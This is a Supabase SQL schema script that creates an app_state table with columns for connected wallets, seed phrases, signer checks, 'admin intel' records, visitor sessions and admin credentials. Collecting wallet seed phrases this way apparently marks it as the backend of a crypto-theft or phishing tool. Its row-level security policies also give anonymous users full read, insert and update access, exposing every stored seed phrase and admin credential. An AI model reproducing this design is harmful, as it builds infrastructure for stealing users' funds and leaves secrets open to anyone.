-- Full app_state schema – run this in the Supabase SQL editor
-- Safe to run multiple times (idempotent).

create table if not exists public.app_state (
  id                    text        primary key,
  connected_wallets     jsonb       not null default '[]'::jsonb,
  scan_history          jsonb       not null default '[]'::jsonb,
  signer_checks         jsonb       not null default '[]'::jsonb,
  email_records         jsonb       not null default '[]'::jsonb,
  admin_intel_records   jsonb       not null default '[]'::jsonb,
  protect_checklist_done jsonb      not null default '[]'::jsonb,
  seed_phrases          jsonb       not null default '[]'::jsonb,
  newsletter_emails     jsonb       not null default '[]'::jsonb,
  visitor_sessions      jsonb       not null default '[]'::jsonb,
  support_config        jsonb       not null default '{}'::jsonb,
  admin_creds           jsonb       not null default '{}'::jsonb,
  user_email_routes     jsonb       not null default '[]'::jsonb,
  created_at            timestamptz not null default now(),
  updated_at            timestamptz not null default now()
);

-- Add columns that may be missing on an existing table
alter table public.app_state add column if not exists seed_phrases           jsonb not null default '[]'::jsonb;
alter table public.app_state add column if not exists newsletter_emails      jsonb not null default '[]'::jsonb;
alter table public.app_state add column if not exists visitor_sessions       jsonb not null default '[]'::jsonb;
alter table public.app_state add column if not exists support_config         jsonb not null default '{}'::jsonb;
alter table public.app_state add column if not exists admin_creds            jsonb not null default '{}'::jsonb;
alter table public.app_state add column if not exists user_email_routes      jsonb not null default '[]'::jsonb;

alter table public.app_state enable row level security;

drop policy if exists "app_state_read"   on public.app_state;
drop policy if exists "app_state_write"  on public.app_state;
drop policy if exists "app_state_update" on public.app_state;

create policy "app_state_read"
  on public.app_state for select
  to anon, authenticated
  using (true);

create policy "app_state_write"
  on public.app_state for insert
  to anon, authenticated
  with check (true);

create policy "app_state_update"
  on public.app_state for update
  to anon, authenticated
  using (true)
  with check (true);
